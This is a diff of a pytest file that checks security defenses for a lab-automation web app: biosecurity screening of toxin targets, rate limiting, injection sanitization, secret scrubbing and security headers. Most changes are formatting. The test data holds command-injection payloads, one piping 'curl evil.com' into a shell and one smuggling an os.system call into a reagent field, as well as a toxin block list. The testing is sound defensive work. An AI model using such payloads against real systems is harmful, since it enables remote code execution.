@@ -9,17 +9,16 @@ Verifies all 5 high-impact enterprise defenses:
 5. Cockpit Security Endpoints: Checksum attestation, CSP headers, path traversal blocks, and SSRF restrictions.
 """
 
-import os
 import pytest
 from starlette.testclient import TestClient
 
+from serve_cockpit import app
 from src.security_sentinel import (
     BiosecurityScreener,
-    TokenBucketRateLimiter,
+    SafeSanitizer,
     SecretScrubber,
-    SafeSanitizer
+    TokenBucketRateLimiter,
 )
-from serve_cockpit import app
 
 
 @pytest.fixture
@@ -31,6 +30,7 @@ def client():
 # 1. BIOSECURITY SCREENING TESTS
 # ==============================================================================
 
+
 def test_biosecurity_safe_target():
     is_safe, reason = BiosecurityScreener.screen_target("KRAS G12D")
     assert is_safe is True
@@ -41,7 +41,12 @@ def test_biosecurity_safe_target():
 
 
 def test_biosecurity_blocks_select_agent_toxins():
-    for toxin in ["Ricin A-Chain", "Botulinum Neurotoxin E", "Bacillus Anthracis Lethal Factor", "Ebola Glycoprotein"]:
+    for toxin in [
+        "Ricin A-Chain",
+        "Botulinum Neurotoxin E",
+        "Bacillus Anthracis Lethal Factor",
+        "Ebola Glycoprotein",
+    ]:
         is_safe, reason = BiosecurityScreener.screen_target(toxin)
         assert is_safe is False
         assert "BIOSECURITY_RESTRICTION" in reason
@@ -50,7 +55,9 @@ def test_biosecurity_blocks_select_agent_toxins():
 def test_biosecurity_blocks_hazardous_sequence_motifs():
     # Sequence containing the catalytic Ricin A-chain motif EAARF
     hazardous_seq = "MKTIIALSYIFCLVFAEAARFIVLKVT"
-    is_safe, reason = BiosecurityScreener.screen_target("Custom Engineered Protein", sequence=hazardous_seq)
+    is_safe, reason = BiosecurityScreener.screen_target(
+        "Custom Engineered Protein", sequence=hazardous_seq
+    )
     assert is_safe is False
     assert "BIOSECURITY_RESTRICTION" in reason
 
@@ -58,6 +65,7 @@ def test_biosecurity_blocks_hazardous_sequence_motifs():
 # ==============================================================================
 # 2. TOKEN BUCKET RATE LIMITER TESTS (DoS & BURST MITIGATION)
 # ==============================================================================
+
 
 def test_token_bucket_burst_and_exhaustion():
     limiter = TokenBucketRateLimiter(capacity=3, refill_rate_per_sec=0.1)
@@ -78,13 +86,14 @@ def test_token_bucket_burst_and_exhaustion():
 # 3. PYTHON SCRIPT CODE INJECTION & ReDoS PREVENTION TESTS
 # ==============================================================================
 
+
 def test_code_literal_injection_sanitization():
     # Adversarial reagent payload attempting to break out of string and execute shell command
     malicious_input = "\"; import os; os.system('curl evil.com | sh'); #"
     sanitized = SafeSanitizer.sanitize_code_literal(malicious_input)
 
     assert ";" not in sanitized
-    assert "\"" not in sanitized
+    assert '"' not in sanitized
     assert "'" not in sanitized
     assert "`" not in sanitized
     assert "os.system" not in sanitized or "import os" not in sanitized
@@ -102,7 +111,7 @@ def test_robot_protocol_generation_escapes_injection():
         reagents=["DIPEA\"; __import__('os').system('dir') #"],
         product_smiles="CC(=O)N1CCNCC1",
         estimated_yield_pct=80.0,
-        difficulty="Routine"
+        difficulty="Routine",
     )
 
     plan = RetrosynthesisPlan(
@@ -111,7 +120,7 @@ def test_robot_protocol_generation_escapes_injection():
         num_steps=1,
         overall_feasibility="Feasible",
         steps=[malicious_step],
-        starting_materials=["A", "B"]
+        starting_materials=["A", "B"],
     )
 
     generated_py = generate_ot2_protocol(plan)
@@ -124,6 +133,7 @@ def test_robot_protocol_generation_escapes_injection():
 # ==============================================================================
 # 4. SECRET SCRUBBING TESTS
 # ==============================================================================
+
 
 def test_secret_scrubber_redaction():
     text_with_keys = (
@@ -140,6 +150,7 @@ def test_secret_scrubber_redaction():
 # ==============================================================================
 # 5. COCKPIT API SECURITY HEADERS & DEFENSES
 # ==============================================================================
+
 
 def test_cockpit_security_headers_and_csp(client):
     resp = client.get("/api/health")
@@ -183,13 +194,12 @@ def test_biosecurity_target_query_rejection(client):
 # 6. NVIDIA SHOWCASE (GREEN COMPUTE, MULTI-GPU & NIM BLUEPRINTS)
 # ==============================================================================
 
+
 def test_green_compute_profiler_and_tco():
     from src.nvidia_showcase import GreenComputeProfiler
 
     impact = GreenComputeProfiler.calculate_campaign_impact(
-        cpu_time_sec=22.8,
-        gpu_time_sec=0.401,
-        num_molecules=10000
+        cpu_time_sec=22.8, gpu_time_sec=0.401, num_molecules=10000
     )
     assert impact["num_molecules"] == 10000
     assert impact["energy_reduction_pct"] > 90.0
